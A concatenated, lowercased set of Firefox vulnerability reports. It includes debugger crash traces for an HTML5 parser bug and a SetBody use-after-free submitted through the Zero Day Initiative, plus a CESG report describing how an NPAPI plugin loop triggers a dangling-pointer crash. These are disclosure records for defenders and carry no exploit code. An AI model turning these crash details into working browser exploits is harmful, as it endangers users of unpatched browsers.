19373530 xul nshtml5tokenizer emitcurrenttagtoken fpo non-fpo conv thiscall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\parser\html\nshtml5tokenizer.cpp 296 006dcbb4 5baf1808 00000000 00000000 00000038 xul nshtml5tokenizer stateloop nshtml5silentpolicy fpo non-fpo conv thiscall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\parser\html\nshtml5tokenizer.cpp 2048 006dcbec 5c29679d 006dcc08 14cee800 006dcd18 xul nshtml5tokenizer tokenizebuffer fpo non-fpo conv thiscall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\parser\html\nshtml5tokenizer.cpp 405 006dcc14 5c2962bd 006dcd18 14cee800 00000000 xul nshtml5stringparser tokenize fpo non-fpo conv thiscall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\parser\html\nshtml5stringparser.cpp 116 006dcc38 5c3949eb 006dcd18 1766ab00 0d05f960 xul nshtml5stringparser parsefragment fpo non-fpo conv thiscall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\parser\html\nshtml5stringparser.cpp 64 006dcc68 5be4285a 0d05f960 0000000a 1766ab00 xul nscontentutils parsefragmenthtml fpo non-fpo conv cdecl c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\dom\base\nscontentutils.cpp 4409 006dcce8 5bcd4763 006dcd18 006dcd08 006dcee8 xul mozilla dom fragmentorelement setinnerhtmlinternal conv thiscall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\dom\base\fragmentorelement.cpp 2280 006dcdb0 5bb7e554 156f76b0 006dcde8 1766ab00 xul mozilla dom elementbinding set_innerhtml fpo non-fpo conv cdecl c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\obj-firefox\dom\bindings\elementbinding.cpp 2699 006dcdfc 5b90719e 156f76b0 00000001 1766ab00 xul mozilla dom genericbindingsetter fpo non-fpo conv cdecl c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\dom\bindings\bindingutils.cpp 2682 006dce84 5b9058bd 00000000 006dd0a0 156f76b0 xul js invoke fpo non-fpo conv cdecl c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\js\src\vm\interpreter.cpp 481 006dcf20 5b9d37e6 006dcf68 00000001 006dd030 xul js invoke fpo non-fpo conv cdecl c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\js\src\vm\interpreter.cpp 533 006dcf5c 5b9d5090 006dd030 19f8db00 ffffff88 xul js invokesetter fpo non-fpo conv cdecl c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\js\src\vm\interpreter.cpp 651 006dcfb0 5b9d66f2 006dd094 006dd1d0 006dd030 xul setexistingproperty fpo non-fpo conv cdecl c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\js\src\vm\nativeobject.cpp 2289 006dd054 5b9d4f36 006dd094 006dd1d0 0ee850b8 xul js nativesetproperty fpo non-fpo conv cdecl c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\js\src\vm\nativeobject.cpp 2323 006dd0ac 5b8bbd69 0ee850b0 006dd1d0 0ee850b8 xul setpropertyoperation fpo non-fpo conv cdecl c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\js\src\vm\interpreter.cpp 290 006de0d4 5bd87e26 00000000 006de1d0 006de1d0 xul interpret fpo non-fpo conv cdecl c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\js\src\vm\interpreter.cpp 2601 006de160 5b907258 156f76b0 006de1c0 19f95940 xul js runscript fpo non-fpo conv cdecl c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\js\src\vm\interpreter.cpp 428 006de1e4 5b9058bd 00000000 156f76b0 006de398 xul js invoke fpo non-fpo conv cdecl c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\js\src\vm\interpreter.cpp 502 006de280 5b72aac4 006de2b8 00000001 006de318 xul js invoke fpo non-fpo conv cdecl c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\js\src\vm\interpreter.cpp 533 006de364 5b72ad13 156f76b0 006de398 177f08e0 xul mozilla dom eventhandlernonnull call fpo non-fpo conv thiscall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\obj-firefox\dom\bindings\eventhandlerbinding.cpp 260 006de4d4 5b72a6f0 17763808 177f08e0 006de560 xul mozilla dom eventhandlernonnull call nsisupports fpo non-fpo conv thiscall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\obj-firefox\dist\include\mozilla\dom\eventhandlerbinding.h 351 006de6e8 5b728688 17763800 177f08e0 006dea44 xul mozilla jseventhandler handleevent fpo non-fpo conv stdcall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\dom\events\jseventhandler.cpp 216 006de94c 5b727336 16770800 006deae8 006dea4c xul mozilla eventlistenermanager handleeventinternal fpo non-fpo conv thiscall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\dom\events\eventlistenermanager.cpp 1164 006de990 5b77a735 00000000 006dea34 00000000 xul mozilla eventtargetchainitem handleeventtargetchain fpo non-fpo conv cdecl c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\dom\events\eventdispatcher.cpp 317 006dea8c 5b7c763f 006deae8 00000000 006deae0 xul mozilla eventdispatcher dispatch fpo non-fpo conv cdecl c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\dom\events\eventdispatcher.cpp 656 006deb48 5b73bb2e 179ef950 00000000 157cec00 xul nsdocumentviewer loadcomplete fpo non-fpo conv stdcall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\layout\base\nsdocumentviewer.cpp 995 006deeb0 5b73b8f7 157cec14 14cee02c 00000000 xul nsdocshell endpageload fpo non-fpo conv thiscall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\docshell\base\nsdocshell.cpp 7505 006def58 5b743547 157ced18 157cec14 14cee02c xul nsdocshell onstatechange fpo non-fpo conv stdcall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\docshell\base\nsdocshell.cpp 7311 006defa0 5b743bcc 157cec14 14cee02c 157ced18 xul nsdocloader dofireonstatechange fpo non-fpo conv thiscall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\uriloader\base\nsdocloader.cpp 1256 006deff8 5b743e4d 14cee02c 00000000 129697a0 xul nsdocloader dostopdocumentload fpo non-fpo conv thiscall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\uriloader\base\nsdocloader.cpp 838 006df034 5b744081 00000001 158cca20 157cec04 xul nsdocloader docloaderisempty fpo non-fpo conv thiscall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\uriloader\base\nsdocloader.cpp 730 006df0b8 5bb4c127 157cec04 16428e48 00000000 xul nsdocloader onstoprequest fpo non-fpo conv stdcall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\uriloader\base\nsdocloader.cpp 612 006df180 5b749d68 158cca20 16428e48 00000000 xul nsloadgroup removerequest fpo non-fpo conv stdcall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\netwerk\base\nsloadgroup.cpp 634 006df1a8 5b7492ec 14cee800 12bf0600 11fbd420 xul nsdocument dounblockonload fpo non-fpo conv thiscall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\dom\base\nsdocument.cpp 9018 006df1cc 5b74c830 00000001 024044c4 024081d0 xul nsdocument unblockonload fpo non-fpo conv thiscall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\dom\base\nsdocument.cpp 8947 006df224 5b72ef6b 006df324 5b7ce89c 17766060 xul nsdocument dispatchcontentloadedevents fpo non-fpo conv thiscall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\dom\base\nsdocument.cpp 5087 006df22c 5b7ce89c 17766060 02446650 02446640 xul nsrunnablemethodimpl void thiscall mozilla dom animation void 1 run fpo non-fpo conv stdcall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\obj-firefox\dist\include\nsthreadutils.h 872 006df324 5b7cd8b6 024081d0 00000000 006df357 xul nsthread processnextevent fpo non-fpo conv stdcall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\xpcom\threads\nsthread.cpp 997 006df358 5ba5f12b 02453300 05d313e3 024044c0 xul mozilla ipc messagepump run fpo non-fpo conv thiscall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\ipc\glue\messagepump.cpp 95 006df390 5ba5f155 024081d0 00000001 5b7cd400 xul messageloop runhandler fpo seh conv thiscall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\ipc\chromium\src\base\message_loop.cc 228 006df3b0 5b7cda7b 0d07cfc0 00000000 006df3d0 xul messageloop run fpo non-fpo conv thiscall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\ipc\chromium\src\base\message_loop.cc 202 006df3c0 5b7cf75f 024044c0 0d07cfc0 006df3e4 xul nsbaseappshell run fpo non-fpo conv stdcall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\widget\nsbaseappshell.cpp 158 006df3d0 5bb1540b 024044c0 006df72d 11fdafa0 xul nsappshell run fpo non-fpo conv stdcall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\widget\windows\nsappshell.cpp 257 006df3e4 5bc4edf1 0d07cfc0 006df650 006df638 xul nsappstartup run fpo non-fpo conv stdcall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\toolkit\components\startup\nsappstartup.cpp 282 006df5c0 5bc4e2d9 00000001 006df760 01c82ff8 xul xremain xre_mainrun fpo non-fpo conv thiscall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\toolkit\xre\nsapprunner.cpp 4326 006df5dc 5bce6229 00000000 01c82ff8 006df760 xul xremain xre_main fpo non-fpo conv thiscall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\toolkit\xre\nsapprunner.cpp 4423 006df738 00ae16d5 00000001 01c82ff8 006df760 xul xre_main fpo non-fpo conv cdecl c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\toolkit\xre\nsapprunner.cpp 4526 006df8d4 00ae1322 02404100 01c86ff8 01c82ff8 firefox do_main fpo non-fpo conv cdecl c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\browser\app\nsbrowserapp.cpp 212 006df97c 00ae10de 00ae257b 00ae257b 00000000 firefox ns_internal_main fpo non-fpo conv cdecl c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\browser\app\nsbrowserapp.cpp 354 006df990 00ae24fe 01c82ff8 feb68fb0 007edf70 firefox wmain fpo non-fpo conv cdecl c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\toolkit\xre\nswindowswmain.cpp 138 006df9d8 754b4198 7fa89000 754b4170 5b470725 firefox tmaincrtstartup fpo non-fpo conv cdecl f dd\vctools\crt\crtw32\startup\crt0.c 255 006df9ec 77723101 7fa89000 7ffab072 00000000 kernel32 basethreadinitthunk fpo non-fpo 006dfa34 777230cf ffffffff 7774ed69 00000000 ntdll rtluserthreadstart fpo seh 006dfa44 00000000 00ae257b 7fa89000 00000000 ntdll rtluserthreadstart fpo non-fpo 0:000 lmi xul loaded module info xul module xul base address 5b660000 image name c program files\nightly\xul.dll machine type 332 i386 time stamp 569fa561 wed jan 20 07:18:57 2016 size 27a4000 checksum 26fe897 characteristics 2122 debug data dirs type size va pointer codeview 7a 20dd3f8 20dbff8 rsds guid a83d4058-e28e-4ebf-a9ba-e1fe6edd1a28 age 2 pdb c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\obj-firefox\toolkit\library\xul.pdb 14 20dd474 20dc074 data not mapped clsid 4 20dd488 20dc088 data not mapped image type file image read successfully from debugger c program files\nightly\xul.dll symbol type pdb symbols loaded successfully from image path z export\symbols\xul.pdb\a83d4058e28e4ebfa9bae1fe6edd1a282\xul.pdb compiler linker front end 0.0 bld 0 back end 12.0 bld 30723 load report private symbols lines source indexed z export\symbols\xul.pdb\a83d4058e28e4ebfa9bae1fe6edd1a282\xul.pdb 0:000 lmvm xul start end module name 5b660000 5de04000 xul private pdb symbols z export\symbols\xul.pdb\a83d4058e28e4ebfa9bae1fe6edd1a282\xul.pdb loaded symbol image file c program files\nightly\xul.dll image path c program files\nightly\xul.dll image name xul.dll timestamp wed jan 20 07:18:57 2016 569fa561 checksum 026fe897 imagesize 027a4000 file version 46.0.0.5863 product version 46.0.0.5863 file flags 2 mask 3f pre-release file os 4 unknown win32 file type 2.0 dll file date 00000000.00000000 translations 0000.04b0 companyname mozilla foundation productname nightly internalname nightly originalfilename xul.dll productversion 46.0a1 fileversion 46.0a1 filedescription 46.0a1 legalcopyright license mpl 2 legaltrademarks mozilla comments mozilla 0:000 vertarget windows 8 version 9600 up free x86 compatible product winnt suite singleuserts kernel32.dll version 6.3.9600.17415 winblue_r4.141028-1500 machine name debug session time thu jan 21 13:03:26.371 2016 utc 8:00 system uptime 0 days 0:32:05.185 process uptime 0 days 0:02:42.905 kernel time 0 days 0:00:00.796 user time 0 days 0:00:02.375 and without the spray 9d4.77c access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=00000000 ebx=ffffffff ecx=16f58efc edx=00000002 esi=179ab8b0 edi=0d363060 eip=5beda4da esp=00fad058 ebp=00fad06c iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210216 xul nshtml5treebuilder endtag 5beda4da 83780c03 cmp dword ptr eax+0ch 3 ds:0023:0000000c 0:000 dc ecx 16f58efc 00000000 1101d100 1a19eb20 1a19ed00 16f58f0c 1a19ece0 e5e5e5e5 e5e5e5e5 e5e5e5e5 16f58f1c e5e5e5e5 e5e5e5e5 e5e5e5e5 e5e5e5e5 16f58f2c e5e5e5e5 e5e5e5e5 e5e5e5e5 e5e5e5e5 16f58f3c e5e5e5e5 e5e5e5e5 e5e5e5e5 e5e5e5e5 16f58f4c e5e5e5e5 e5e5e5e5 e5e5e5e5 e5e5e5e5 16f58f5c e5e5e5e5 e5e5e5e5 e5e5e5e5 e5e5e5e5 16f58f6c e5e5e5e5 e5e5e5e5 e5e5e5e5 e5e5e5e5 credit this vulnerability was discovered by ca0nguyen working with hp s zero day initiative further details if supporting files were contained with this report they are provided within a password protected zip file the password is the zdi candidate number in the form zdi-can-xxxx where xxxx is the id number please confirm receipt of this report we expect all vendors to remediate zdi vulnerabilities within 120 days of the reported date if you are ready to release a patch at any point leading up the the deadline please coordinate with us so that we may release our advisory detailing the issue if the 120 day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations so that the public can protect themselves in the absence of a patch please keep us updated regarding the status of this issue and feel free to contact us at any time zero day initiative zdi-disclosures hpe.com the pgp key used for all zdi vendor communications is available from information about the zdi established by tippingpoint and acquired by hewlett-packard the zero day initiative zdi represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities the zdi is unique in how the acquired vulnerability information is used the zdi does not re-sell the vulnerability details or any exploit code instead upon notifying the affected product vendor the zdi provides its hp tippingpoint customers with zero day protection through its intrusion prevention technology explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available disclosure policy our vulnerability disclosure policy is available online at	11
regressed bug 445229 exploitable plugin crash the cesg sent a vulnerability report to the security alias concerning a bug in npapi cesg ref 54041238 vulnerability id 429485 details in the attached pdf unfortunately no testcase as was true of the regressed bug 445229 firefox has suffered a regression of bug 445229 we believe there to be an incorrect assumption regarding the purpose of a certain variable assignment which is assumed to be obsolete this may cause the npapi subsystem to crash the assignment at 0 is to re-validate a dangling pointer under certain conditions 0 refers to line 916 in l1912 they continue the comment in both the before and after commits explains the purpose of reloading the entry there is an assumption that it is only required for the sake of the assertion after changing the assertion to a format that does not require entry the re-assignment has been removed the removal of the assignment leads to a dangling pointer dereference in a non-standard feature of firefox the npapi plugin subsystem proof of concept the high-level poc to trigger the vulnerability and cause a crash is as follows 1 write a npapi plug-in which has a function that creates and returns a new npobject every time it is called 2 call that function in a loop from javascript the browser will likely crash when a hashtable object resizes its underlying data storage	11
zdi-can-3574 nshtmldocument setbody use-after-free rce hp s zero day initiative has identified a vulnerability affecting the following products mozilla firefox vulnerability details tested against firefox on windows 8.1 32-bit javascript warning successfully compiled asm.js code total compilation time 1ms not stored in cache too small to benefit file line 0 javascript error the character encoding of the html document was not declared the document will render with garbled text in some browser configurations if the document contains characters from outside the us-ascii range the character encoding of the page must be declared in the document or in the transfer protocol file line 0 javascript error telemetrystopwatch key fx_page_load_ms was already initialized file resource gre/modules/telemetrystopwatch.jsm line 52 javascript error ns_error_not_available prompt aborted by user file resource gre/components/nsprompter.js line 431 javascript error uncaught exception out of memory file line 98 2d8.43c access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=00070006 ebx=00028410 ecx=0017c560 edx=00028544 esi=70d68518 edi=70d40000 eip=222201d1 esp=0017c558 ebp=00005245 iopl=0 nv up ei ng nz na pe cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210287 222201d1 813c0757696e45 cmp dword ptr edi+eax 456e6957h ds:0023:70db0006 0:000 kv childebp retaddr args to child warning frame ip not in any known module following frames may be wrong 0017c564 61109f1a 00000002 171e6940 14469240 0017c580 60fdbad1 00000000 00000000 0017c790 xul isallowedaschild fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\dom\base\nsinode.cpp 1759 0017c590 60fda05b 00000000 14469240 00000000 xul nsinode ensurepreinsertionvalidity2 fpo non-fpo conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\dom\base\nsinode.cpp 1910 0017c790 61eeefdd 00000000 14469240 00000000 xul nsinode replaceorinsertbefore fpo non-fpo conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\dom\base\nsinode.cpp 1977 0017c7b8 61dc7a93 14469240 0017c7d8 0017c938 xul nshtmldocument setbody fpo 2,2,4 conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\dom\html\nshtmldocument.cpp 1055 0017c7e8 6107fc75 103195f0 0017c828 42710000 xul mozilla dom htmldocumentbinding set_body fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\obj-firefox\dom\bindings\htmldocumentbinding.cpp 201 0017c834 60efe92c 103195f0 00000001 42710000 xul mozilla dom genericbindingsetter fpo 3,10,0 conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\dom\bindings\bindingutils.cpp 2642 0017c8cc 60e82040 00000000 0017cc40 0017ca78 xul js invoke fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\vm\interpreter.cpp 489 0017c970 60e7acda 0017c9b0 00000001 0017ca78 xul js invoke fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\vm\interpreter.cpp 542 0017c9e8 60e7a73d 0017cb08 0017cf00 0017ca78 xul setexistingproperty fpo 6,21,0 conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\vm\nativeobject.cpp 2278 0017ca9c 60e7a3d8 0017cb08 0017cf00 0017cc90 xul js nativesetproperty fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\vm\nativeobject.cpp 2312 0017cad8 611d5dca 0017cb08 0017cf00 0017cc90 xul js setproperty fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\vm\nativeobject.h 1453 0017cb94 611d466c 103195f0 0017ccc4 0017cf00 xul js setpropertyignoringnamedgetter fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\proxy\baseproxyhandler.cpp 136 0017cbe8 611d459f 103195f0 0017ccc4 0017cf00 xul mozilla dom domproxyhandler set fpo non-fpo conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\dom\bindings\domjsproxyhandler.cpp 218 0017cc48 611d44b8 0017ccc4 0017cf00 0017cc90 xul js proxy set fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\proxy\proxy.cpp 345 0017cc60 611d440d 103195f0 0017ccc4 0017cf00 xul js proxy_setproperty fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\proxy\proxy.cpp 606 0017cca0 60e861b0 0017ccc4 0017cf00 0017cd18 xul jsobject nonnativesetproperty fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\jsobj.cpp 1046 0017ccc8 60e87aa6 103195f0 0017ce1c 0017cf00 xul js directproxyhandler set fpo non-fpo conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\proxy\directproxyhandler.cpp 241 0017cd20 611d459f 103195f0 0017ce1c 0017cf00 xul js crosscompartmentwrapper set fpo non-fpo conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\proxy\crosscompartmentwrapper.cpp 181 0017cd80 611d44b8 0017ce1c 0017cf00 0017cdd0 xul js proxy set fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\proxy\proxy.cpp 345 0017cd98 60e7a432 103195f0 0017ce1c 0017cf00 xul js proxy_setproperty fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\proxy\proxy.cpp 606 0017cdd8 60e7a33a 0017ce1c 0017cf00 0c0560b0 xul js setproperty fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\vm\nativeobject.h 1452 0017ce2c 60eb3dfd 0c0560a8 0017cf00 0c0560b0 xul setpropertyoperation fpo 3,12,0 conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\vm\interpreter.cpp 313 0017dad0 61465216 09d508cc 62a31130 0017db90 xul interpret fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\vm\interpreter.cpp 2601 0017db10 60efe976 103195f0 0017db80 ffffff88 xul js runscript fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\vm\interpreter.cpp 430 0017dba4 60fe344d 00000000 103195f0 0017df30 xul js invoke fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\vm\interpreter.cpp 510 0017dc6c 60fb775c 0017dd70 0017dcc8 0017dca8 xul js call fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\js\src\jsapi.cpp 2965 0017dd34 60fb762e 103195f0 0017dd70 162d6970 xul mozilla dom eventhandlernonnull call fpo 5,42,0 conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\obj-firefox\dom\bindings\eventhandlerbinding.cpp 260 0017dea4 60fb7bf5 171c2d48 162d6970 0017df18 xul mozilla dom eventhandlernonnull call nsisupports fpo 7,82,0 conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\obj-firefox\dist\include\mozilla\dom\eventhandlerbinding.h 351 0017e0b0 60e25099 171c2d40 162d6970 0017e43c xul mozilla jseventhandler handleevent fpo non-fpo conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\dom\events\jseventhandler.cpp 216 0017e324 60e23b8b 144df800 0017e4b0 0017e444 xul mozilla eventlistenermanager handleeventinternal fpo 5,150,0 conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\dom\events\eventlistenermanager.cpp 1156 0017e388 60fd5c40 00000000 0017e430 13aa44f8 xul mozilla eventtargetchainitem handleeventtargetchain fpo 2,15,0 conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\dom\events\eventdispatcher.cpp 317 0017e45c 60fb4582 0017e4b0 00000000 0017e4a4 xul mozilla eventdispatcher dispatch fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\dom\events\eventdispatcher.cpp 655 0017e510 60fabdaa 1717e5e0 00000000 fffdffef xul nsdocumentviewer loadcomplete fpo non-fpo conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\layout\base\nsdocumentviewer.cpp 1001 0017e878 60fabb56 13aa4414 1783982c 00000000 xul nsdocshell endpageload fpo non-fpo conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\docshell\base\nsdocshell.cpp 7418 0017e89c 6114dfb0 15ce21c8 60f95904 17839800 xul nsdocshell onstatechange fpo 5,0,0 conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\docshell\base\nsdocshell.cpp 7224 0017e8c0 6121177e 13aa4800 13aa4400 0017e98c xul nsstandardurl schemeis fpo 3,0,4 conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\netwerk\base\nsstandardurl.cpp 1878 0017e960 61212e35 13aa4414 1783982c 13aa4518 xul nssecurebrowseruiimpl onstatechange fpo 5,17,0 conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\security\manager\ssl\nssecurebrowseruiimpl.cpp 1176 0017e9fc 612132e2 00000001 15010160 13aa4404 xul nsdocloader dostopdocumentload fpo 2,16,4 conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\uriloader\base\nsdocloader.cpp 831 0017ead4 6120f4dd 15010180 612107e1 15010160 xul nsdocloader onstoprequest fpo 4,27,0 conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\uriloader\base\nsdocloader.cpp 609 0017eaf0 61210534 15010180 629864f8 0017eb44 xul nsloadgroup addref fpo 1,0,0 conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\netwerk\base\nsloadgroup.cpp 159 0017eb00 6113c461 15010160 629864f8 0017eb44 xul nsloadgroup queryinterface fpo 3,0,0 conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\netwerk\base\nsloadgroup.cpp 159 0017eb10 6113c428 13b5fd10 629864f8 0017eb44 xul nsweakreference queryreferent fpo 3,0,0 conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\xpcom\glue\nsweakreference.cpp 123 0017eb2c 60fd7f64 fb4dc964 62988b48 0017eb64 xul nsqueryreferent operator fpo 1,0,4 conv fastcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\xpcom\glue\nsweakreference.cpp 56 0017eb64 60e159e5 00000000 0f1ec800 1783a800 xul nsidocument getdocumentloadgroup fpo non-fpo conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\dom\base\nsidocument.h 332 0017eb80 60e18627 60e1863b 00000001 01c41240 xul nsdocument unblockonload fpo 1,0,0 conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\dom\base\nsdocument.cpp 9046 0017ebd8 60e1c19c 60fd07a9 42725640 0017eec8 xul nsdocument dispatchcontentloadedevents fpo non-fpo conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\dom\base\nsdocument.cpp 5179 0017ebdc 60fd07a9 42725640 0017eec8 01c41240 xul nsrunnablemethodimpl void thiscall mozilla dom xuldocument void 1 run fpo 1,0,0 conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\obj-firefox\dist\include\nsthreadutils.h 872 0017ecec 6111324a 01c41240 00000000 0017ed0f xul nsthread processnextevent fpo non-fpo conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\xpcom\threads\nsthread.cpp 964 0017ed10 61131586 629c93b0 00000000 00000000 xul ns_processpendingevents fpo 0,2,4 conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\xpcom\glue\nsthreadutils.cpp 239 0017ed40 6112eea8 00000200 000c022e 0f438c00 xul nswindow dispatchpendingevents fpo non-fpo conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\widget\windows\nswindow.cpp 3944 0017ee88 61112bd4 00000200 0017eec4 0017eec8 xul nswindow processmessage fpo non-fpo conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\widget\windows\nswindow.cpp 5302 0017eeb4 61112b1c 0f438c00 01000200 00000000 xul nswindow windowprocinternal fpo non-fpo conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\widget\windows\nswindow.cpp 4583 0017eef4 61112af6 61112b29 000c022e 00000200 xul callwindowproccrashprotected fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\xpcom\base\nscrashonexception.cpp 35 0017ef10 76e28aa0 000c022e 00000200 00000000 xul nswindow windowproc fpo non-fpo conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\widget\windows\nswindow.cpp 4535 0017ef3c 76e28c71 61112ac9 000c022e 00000200 user32 internalcallwinproc 0017efc0 76e28d47 000c022e 00000200 00000000 user32 usercallwinproccheckwow fpo non-fpo 0017f028 76e28a70 1922213b 0017f090 60fcf82d user32 dispatchmessageworker fpo non-fpo 0017f034 60fcf82d 0017f074 01c1c404 00000000 user32 dispatchmessagew fpo non-fpo 0017f090 60fcfc4c 00000000 01c1c404 0017f1c4 xul nsappshell processnextnativeevent fpo non-fpo conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\widget\windows\nsappshell.cpp 373 0017f0ac 60fd0440 00000000 0000000a 00000000 xul nsbaseappshell onprocessnextevent fpo 3,1,0 conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\widget\nsbaseappshell.cpp 271 